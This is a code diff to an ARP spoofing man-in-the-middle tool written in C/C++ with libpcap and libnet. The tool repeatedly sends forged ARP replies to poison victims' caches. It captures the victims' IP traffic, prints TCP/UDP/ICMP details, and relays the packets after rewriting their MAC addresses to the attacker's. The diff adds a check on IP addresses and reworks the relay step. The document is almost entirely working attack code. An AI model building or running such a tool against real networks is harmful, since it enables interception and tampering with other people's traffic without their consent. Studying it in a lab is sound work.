@@ -66,6 +66,7 @@ void* Attack(void* info){
 
     bzero(attack_packet->padding, 18);
 
+
     while(1){ // 2 attacks per 1~6 random seconds (asynchronous attack)
         for(int i = 0; i < 2; i++){
             printf("\n----------_ARP (Session %d)_----------\n", PP->session_Number);
@@ -233,9 +234,10 @@ temp->sender_mac_addr[1], temp->sender_mac_addr[2], temp->sender_mac_addr[3], te
 }
 
 //void Manage_Session(struct Parameter_Pthread* pt3){
-void Manage_Session(char** argv, char** smac, char** tmac, char* attack_mac, pcap_t* handle, int num_of_parameter){
+void Manage_Session(char** argv, char** smac, char** tmac, char* attack_ip, char* attack_mac, pcap_t* handle, int num_of_parameter){
     struct pcap_pkthdr* header;
     const u_char* packet;
+    int cnt_session = 2;
     int session_Number = 0;
     int count = 0; // Prevention of Duplication
 
@@ -246,6 +248,7 @@ void Manage_Session(char** argv, char** smac, char** tmac, char* attack_mac, pca
         if(count == 1){
             break;
         }
+
         session_Number = i+1;
         printf("\n@ ######################## @\n");
         printf("[ -- Session < %d > %u Bytes captured -- ]\n", session_Number, header->caplen);
@@ -269,66 +272,103 @@ void Manage_Session(char** argv, char** smac, char** tmac, char* attack_mac, pca
             if(tmp == 1){
                 packet += 14;
                 char* tmp2; // IP protocol type
+                bool isCorrect2 = false;
                 IP_header ih;
                 tmp2 = ih.Print_IP(packet);
-                if(tmp2 == NULL){
-                    printf("{ IP version is not IPv4 }\n");
-                    return ;
-                }
-                if(!strcmp(tmp2, "1")){
-                    printf("[ ---------_ICMP_--------- ]\n");
-                }
-                else if(!strcmp(tmp2, "6"))
-                    printf("[ ---------_TCP_--------- ]\n");
-                else if(!strcmp(tmp2, "11"))
-                    printf("[ ---------_UDP_--------- ]\n");
-                else
-                    printf("[ ------_Unknown Protocol_------ ]\n");
-                packet += 20;
-                TCP_header th;
-                UDP_header uh;
-                if(!strcmp(tmp2, "1")){
-                    printf("[ PING Packet ]\n");
-                }
-                else if(!strcmp(tmp2, "6")){
-                    th.Print_TCP(packet);
-                }
-                else if(!strcmp(tmp2, "11")){
-                    uh.Print_UDP(packet);
+                isCorrect2 = ih.Check_IP(packet, argv[cnt_session], argv[cnt_session+1],attack_ip);
+                if(isCorrect2 == true){
+                    if(tmp2 == NULL){
+                        printf("{ IP version is not IPv4 }\n");
+                        return ;
+                    }
+                    if(!strcmp(tmp2, "1")){
+                        printf("[ ---------_ICMP_--------- ]\n");
+                    }
+                    else if(!strcmp(tmp2, "6"))
+                        printf("[ ---------_TCP_--------- ]\n");
+                    else if(!strcmp(tmp2, "11"))
+                        printf("[ ---------_UDP_--------- ]\n");
+                    else
+                        printf("[ ------_Unknown Protocol_------ ]\n");
+                    packet += 20;
+                    TCP_header th;
+                    UDP_header uh;
+                    if(!strcmp(tmp2, "1")){
+                        printf("[ PING Packet ]\n");
+                    }
+                    else if(!strcmp(tmp2, "6")){
+                        th.Print_TCP(packet);
+                    }
+                    else if(!strcmp(tmp2, "11")){
+                        uh.Print_UDP(packet);
+                    }
+                    else{
+                        printf("{ No Network Data here for this protocol! }\n");
+                    }
+
+                    // Relay
+                    // change sender mac address to my mac address
+                    packet -= 34;
+                    printf("\n< Before Relay Packet Info >\n");
+                    struct ARP_header* Ah = (struct ARP_header*)(packet);
+                    Print_ARP(Ah);
+
+                    tomar_mac_addr(Ah->src_mac_addr, attack_mac);
+                    tomar_mac_addr(Ah->Destination_mac_addr, tmac[i]);
+                    struct libnet_ethernet_hdr* eh = (struct libnet_ethernet_hdr*)(packet); // ether_dhost, ether_shost / u_int8_t
+                    memcpy(eh->ether_dhost,  Ah->Destination_mac_addr, sizeof(Ah->Destination_mac_addr));
+                    memcpy(eh->ether_shost, Ah->src_mac_addr, sizeof(Ah->src_mac_addr));
+
+                    for(int i = 0; i < 2; i++){ // Send Relay Packet 2 times
+                        if(pcap_sendpacket(handle,  reinterpret_cast<u_char*>(eh), header->caplen) != 0){
+                            perror("{ send packet error }");
+                            exit(1);
+                        }
+                    }
+
+                    printf("\n< After Relay Packet Info >\n");
+                    struct ARP_header* aa = (struct ARP_header*)(packet);
+                    Print_ARP(aa);
+
+                    packet += 14;
+                    char* tmp22; // IP protocol type
+                    IP_header ih2;
+                    tmp22 = ih2.Print_IP(packet);
+                    if(tmp22 == NULL){
+                        printf("{ IP version is not IPv4 }\n");
+                        return ;
+                    }
+                    if(!strcmp(tmp2, "1")){
+                        printf("[ ---------_ICMP_--------- ]\n");
+                    }
+                    else if(!strcmp(tmp2, "6"))
+                        printf("[ ---------_TCP_--------- ]\n");
+                    else if(!strcmp(tmp2, "11"))
+                        printf("[ ---------_UDP_--------- ]\n");
+                    else
+                        printf("[ ------_Unknown Protocol_------ ]\n");
+                    packet += 20;
+                    TCP_header th2;
+                    UDP_header uh2;
+                    if(!strcmp(tmp2, "1")){
+                        printf("[ PING Packet ]\n");
+                    }
+                    else if(!strcmp(tmp2, "6")){
+                        th2.Print_TCP(packet);
+                    }
+                    else if(!strcmp(tmp2, "11")){
+                        uh2.Print_UDP(packet);
+                    }
+                    else{
+                        printf("{ No Network Data here for this protocol! }\n");
+                    }
+                    printf("[ Success to send Relay packet! ]\n");
+                    printf("[ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@ ]\n");
+                    count++;
                 }
                 else{
-                    printf("{ No Network Data here for this protocol! }\n");
+                    printf("{ Wrong IP address! }\n");
                 }
-
-                // Relay
-                // change sender mac address to my mac address
-                packet -= 34;
-                struct ARP_header* Ah = (struct ARP_header*)(packet);
-                // sender's mac -> attacker's mac
-                //tomar_mac_addr(Ah->src_mac_addr, attack_mac);
-                tomar_mac_addr(Ah->sender_mac_addr, attack_mac);
-
-                // attacker's mac -> target's mac
-                //tomar_mac_addr(Ah->Destination_mac_addr, tmac[i]);
-                tomar_mac_addr(Ah->target_mac_addr, tmac[i]);
-
-                struct libnet_ethernet_hdr* eh = (struct libnet_ethernet_hdr*)(packet); // ether_dhost, ether_shost / u_int8_t
-                memcpy(eh->ether_dhost,  Ah->target_mac_addr, sizeof(Ah->target_mac_addr));
-                memcpy(eh->ether_shost, Ah->sender_mac_addr, sizeof(Ah->sender_mac_addr));
-
-                for(int i = 0; i < 2; i++){ // Send Relay Packet 2 times
-                    if(pcap_sendpacket(handle,  reinterpret_cast<u_char*>(eh), 42) != 0){
-                        perror("{ send packet error }");
-                        exit(1);
-                    }
-                }
-                Ethernet_header eh1;
-                eh1.Print_Eth(packet);
-                printf("\n< Relayed Packet Info >\n");
-                ARP_header* aa = (struct ARP_header*)(packet);
-                Print_ARP(aa);
-                printf("[ Success to send Relay packet! ]\n");
-                count++;
             }
         }
         // Check broadcast packets sended by sender
@@ -344,8 +384,8 @@ void Manage_Session(char** argv, char** smac, char** tmac, char* attack_mac, pca
             Ah2->op = htons(OP_ARP_REPLY);
 
             // target -> sender
-            tomar_ip_addr(&src_in_addr, argv[i+2]);
-            tomar_ip_addr(&target_in_addr, argv[i+1]);
+            tomar_ip_addr(&src_in_addr, argv[cnt_session+1]);
+            tomar_ip_addr(&target_in_addr, argv[cnt_session]);
             memcpy(Ah2->sender_ip_addr, &src_in_addr, IP_ADDR_LEN);
             memcpy(Ah2->target_ip_addr, &target_in_addr, IP_ADDR_LEN);
 
@@ -376,8 +416,8 @@ void Manage_Session(char** argv, char** smac, char** tmac, char* attack_mac, pca
             attack_packet->prot_addr_size = IP_ADDR_LEN;
             attack_packet->op = htons(OP_ARP_REPLY);
 
-            tomar_ip_addr(&src_in_addr, argv[i+2]);
-            tomar_ip_addr(&target_in_addr, argv[i+1]);
+            tomar_ip_addr(&src_in_addr, argv[cnt_session+1]);
+            tomar_ip_addr(&target_in_addr, argv[cnt_session]);
 
             tomar_mac_addr(attack_packet->Destination_mac_addr, smac[i]);
             tomar_mac_addr(attack_packet->target_mac_addr, smac[i]);
@@ -401,6 +441,7 @@ void Manage_Session(char** argv, char** smac, char** tmac, char* attack_mac, pca
         else{
             printf("{ This packet has no relation with this program. }\n");
         }
+        cnt_session += 2;
     }
 }
 
